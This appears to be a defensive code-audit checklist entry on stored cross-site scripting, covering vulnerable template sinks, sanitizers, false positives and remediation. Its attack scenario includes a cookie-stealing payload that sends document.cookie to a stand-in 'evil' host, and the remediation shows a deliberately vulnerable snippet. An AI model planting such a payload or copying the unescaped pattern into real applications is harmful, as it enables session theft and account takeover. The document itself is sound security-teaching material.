---
id: P39
name: StoredXSS
area: V1 Encoding and Sanitization
refs: ASVS V5.3.x / WSTG-INPV-02 / CS: Cross Site Scripting Prevention
requires: [backend, db]
---

# P39 — Stored XSS

## Overview
Stored (persistent) Cross-Site Scripting (XSS) occurs when untrusted user input — a comment, profile bio, support ticket, message, or article body — is **persisted to a database or data store** and later rendered into an HTML response for *other* users without context-correct encoding or sanitization. Unlike reflected XSS, the payload is stored server-side, so the attacker does not need to social-engineer each victim: every user who views the affected page is compromised automatically. The root cause is identical to other XSS variants — untrusted data reaches an output sink through a path that does not encode for the relevant context (HTML body, attribute, JavaScript string, URL) — but the persistence makes it higher-severity: it is self-propagating within the application, affects privileged viewers (administrators, moderators), and survives until the stored record is removed.

## What to check
- Is any user-submitted free-text field (`bio`, `body`, `comment`, `description`, `displayName`, `signature`, `note`, `address`, `rich_text`) persisted and later rendered into HTML without encoding?
- Where the field is meant to hold rich text/HTML (WYSIWYG), is a **server-side sanitizer** (DOMPurify, sanitize-html, nh3, bleach, OWASP Java HTML Sanitizer, Rails `sanitize`) applied before storage or render? Allow-list policies only — never deny-list tag stripping.
- Is the **output context** matched to the right encoder? HTML body → HTML-encode; attribute → attribute-encode; inside `<script>` → JS-string-encode; in `href`/`src` → URL-encode. HTML-escaping alone is insufficient in a JS string or a `javascript:` URL.
- Has the template engine's auto-escaping been explicitly disabled for the stored field — EJS `<%- %>`, Pug `!=`, React `dangerouslySetInnerHTML`, Vue `v-html`, Svelte `{@html}`, Django/Jinja `{% autoescape off %}` or `|safe`, Go `text/template`, PHP `echo $row['bio']` without `htmlspecialchars`?
- Are stored values interpolated into non-body contexts (event handlers, `<script>` blocks, `href`/`src` attributes) where HTML-encoding allows breakout?
- Does the field flow from storage into a JSON/REST response that a client then injects via `innerHTML`/`v-html` (stored → DOM XSS chain)?
- Are stored values exported into emails, PDFs, admin dashboards, or logs that re-render HTML (each is a separate sink)?
- Does the application rely solely on a Content Security Policy with no output encoding? CSP reduces but does not eliminate XSS.
- For database-backed fields surfaced in admin tools or internal dashboards, are they encoded there too? Stored XSS in an admin view leads to admin compromise.

## Static signals
Persistence of raw/unsanitized input followed by unescaped output:
- `await Comment.create({ body: req.body.body })` ... later `res.send(comment.body)` or template `<%- comment.body %>`
- `db.comments.insert({ body })` with no sanitizer on the write path
- ORM/mapper that stores the string as-is (most do): Prisma `.create()`, Sequelize `.create()`, Mongoose `.save()`, ActiveRecord `.create`, Django `.save()`, SQLAlchemy `session.add()`

Rich-text / HTML output sinks (escaping disabled or sanitizer bypassed):
- Vue `v-html="comment.body"`; Svelte `{@html comment.body}`
- React `dangerouslySetInnerHTML={{ __html: post.body }}`
- EJS `<%- comment.body %>`; Pug `div!= comment.body`
- Django/Jinja `{% autoescape off %}{{ comment.body }}{% endautoescape %}`, `{{ comment.body|safe }}`
- Go `text/template` rendering a stored string (NOT auto-escaped); `html/template` is safe by default
- PHP `echo $row['bio'];` (no `htmlspecialchars`)
- Ruby/ERB `<%== comment.body %>` (raw) or `<%= raw comment.body %>`
- JSP `<%= comment.getBody() %>` (scriptlet, unescaped); JSTL `<c:out>` is escaped by default
- Thymeleaf `th:utext="${comment.body}"` (unescaped) vs `th:text` (escaped)

Sanitizer missing or misconfigured:
- `app.use(express.static(...))` serving user-uploaded HTML without `X-Content-Type-Options: nosniff` and a CSP
- Custom regex-based tag stripper instead of a maintained sanitizer (DOMPurify/sanitize-html/nh3/bleach/OWASP Java HTML Sanitizer)
- Allow-list that permits `<script>`, `on*` attributes, or `javascript:`/`data:` URLs
- Sanitizer applied on input only, but field later re-rendered in a different context (attribute, JS string) — input-side sanitize does not cover all output contexts

Field names commonly storing rich text (audit these in models/schemas):
- `bio`, `about`, `description`, `body`, `content`, `message`, `comment`, `note`, `signature`, `displayName`, `title`, `alt`, `caption`

## False positives
- Framework auto-escaping is enabled and was not disabled for that output (Django autoescape on, Jinja `autoescape=True`, EJS `<%=%>`, React `{}`, Angular `{{}}`, Go `html/template`). Confirm the output context matches the encoder.
- The stored field is a plain-text field rendered with auto-escaping on (no `v-html`, no `dangerouslySetInnerHTML`, no `|safe`).
- The value is a strict server-controlled type (integer, boolean, UUID, enum) — it cannot carry markup.
- Rich text is sanitized on **write** with a maintained allow-list sanitizer **and** rendered with a context-aware encoder on **read** — defense-in-depth intact.
- The stored HTML is only ever sent as `Content-Type: application/json` and the client treats it as inert data (never assigns it to `innerHTML`/`v-html`).
- The field is rendered in a non-browser context (plain-text email with a strict text-only mailer) — verify the mailer does not auto-detect HTML.

## Attack scenario
1. Attacker registers a normal account and posts a comment (or edits their profile `bio`) with payload: `<img src=x onerror="fetch('//evil/?c='+document.cookie)">`. The application stores the raw string to the database.
2. The payload persists server-side — no per-victim link is needed.
3. Other users (and administrators) view the comment thread; the stored string is rendered into the page without encoding, firing `onerror` in each viewer's session.
4. In each victim's browser the script runs with the victim's privileges: it exfiltrates the session cookie / bearer token / CSRF token, performs authenticated actions, or pivots to defacing the page.
5. Because an administrator eventually opens the admin/moderation panel (where the field is also rendered unescaped), the attacker escalates to admin-level account takeover.

## Impact
- **Confidentiality**: session/token theft and leakage of any DOM-accessible data for every viewer of the stored payload.
- **Integrity**: arbitrary script execution in victims' sessions — mass account takeover, fraudulent transactions, wormable propagation if the script auto-posts more payloads.
- **Availability**: defacement, forced redirect to malware, UI lockout.
- Severity is high by default and can be critical: stored XSS is self-triggering, affects all viewers including administrators, and can enable full application compromise via the admin sink.

## Remediation
Encode on output for the target context; sanitize rich text with a maintained allow-list library. Do not concatenate or store raw HTML intended for rendering.
```ts
// VULNERABLE — raw HTML stored, then rendered unescaped
await Comment.create({ body: req.body.body });          // stored as-is
// template: <div v-html="comment.body"></div>          // fires payload for every viewer

// SAFE — sanitize rich text on write, encode on read
import DOMPurify from 'isomorphic-dompurify';
const clean = DOMPurify.sanitize(req.body.body, { ALLOWED_TAGS: ['b','i','a','p','br'], ALLOWED_ATTR: ['href'] });
await Comment.create({ body: clean });
// template auto-escapes by default; only use a sanitizer + context-aware encoder for rich text
```
Add a strict Content Security Policy (`script-src 'self'` with nonces/hashes, no `unsafe-inline`) as defense-in-depth — it caps the blast radius if an encoding or sanitizer bug slips through. Prefer sanitizing on write (so a single stored record is safe everywhere) while still encoding on read for the exact output context.

## References
- OWASP ASVS V5.3.x — Output encoding and injection prevention
- OWASP WSTG-INPV-02 — Testing for stored XSS
- OWASP Cheat Sheets: Cross Site Scripting Prevention, DOM based XSS Prevention, Content Security Policy
